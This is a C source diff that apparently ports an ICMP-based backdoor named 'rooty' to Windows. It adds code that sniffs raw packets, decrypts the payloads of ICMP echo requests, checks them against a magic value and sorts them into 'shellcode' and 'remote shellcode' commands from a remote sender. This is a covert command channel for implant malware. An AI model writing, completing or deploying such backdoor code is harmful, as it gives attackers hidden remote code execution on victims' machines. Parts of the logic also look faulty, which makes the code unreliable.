@@ -1,6 +1,5 @@
-#include "rooty.h"
+#include "rooty_win.h"
 
-FILE *logfile;
 struct sockaddr_in source,dest;
 
 int main(int argc, char *argv[]) {
@@ -84,7 +83,7 @@ CLEANUP:
    return 0;   
 }
 
-int sniffer_loop(SOCKET *s) {
+uint32_t sniffer_loop(SOCKET *s) {
    uint8_t buffer[65536];
    int bytes_read = 0;
 
@@ -94,7 +93,10 @@ int sniffer_loop(SOCKET *s) {
    }
 }
 
-void process_packet(const uint8_t *buffer, uint32_t len) {
+uint32_t process_packet(const uint8_t *buffer, uint32_t len) {
+   uint8_t *decrypted_data;
+   struct in_addr source_address;
+
    IPV4_HDR *ip = (IPV4_HDR *)buffer;
    uint32_t ip_len = ((ip->ip_header_len & 0x0f) * 4);
    
@@ -105,10 +107,38 @@ void process_packet(const uint8_t *buffer, uint32_t len) {
    uint32_t data_len = len - ip_len - icmp_len;
    
    if((ip_len < len) && (ip->ip_protocol == IPPROTO_ICMP)) {
+      source_address.s_addr = ip->ip_srcaddr;
+
       if(((ip_len + icmp_len < len)) && ((icmp->type == 8) && (icmp->code == 0))) {
-         LOG_DEBUG("IP: %d ICMP %d", ip_len, icmp_len);
-         LOG_DEBUG("ICMP Type: %02x Code: %02x", icmp->type, icmp->code);
-         hexdump((const char *)buffer, len);
+         if(((ip_len + icmp_len + data_len) <= len) && ((data_len > 0) && (data_len < 5000))) {
+            if((decrypted_data = (uint8_t *)malloc(data_len)) == NULL) {
+               LOG_ERROR("Failed to malloc %d bytes for decrypted data.", data_len);
+               return 1;
+            }
+      
+            if(decrypt_message(data, decrypted_data, data_len, (uint8_t *)&icmp->checksum) != data_len) {
+               LOG_ERROR("Failed to decrypt received packet.");
+               free(decrypted_data);
+               return 1;
+            }
+
+            if(!strcmp((const char *)decrypted_data, MAGIC)) {
+               LOG_DEBUG("Received unknown packet.");
+               return 1;
+            }
+            
+            if(decrypted_data[6] & MESSAGE_WINDOWS_32) {
+               if(decrypted_data[6] & MESSAGE_SHELLCODE) {
+                  LOG_DEBUG("Received Windows shellcode message from %s", inet_ntoa(source_address));
+               } else if(decrypted_data[6] & MESSAGE_REMOTE_SHELLCODE) {
+                  LOG_DEBUG("Received Windows remote shellcode message from %s", inet_ntoa(source_address));
+               } else {
+                  LOG_DEBUG("Received an unknown Windows message from %s", inet_ntoa(source_address));
+               }
+            } else {
+               LOG_DEBUG("Received an unknown message from %s", inet_ntoa(source_address));
+            }
+         }
       }
    }
 }
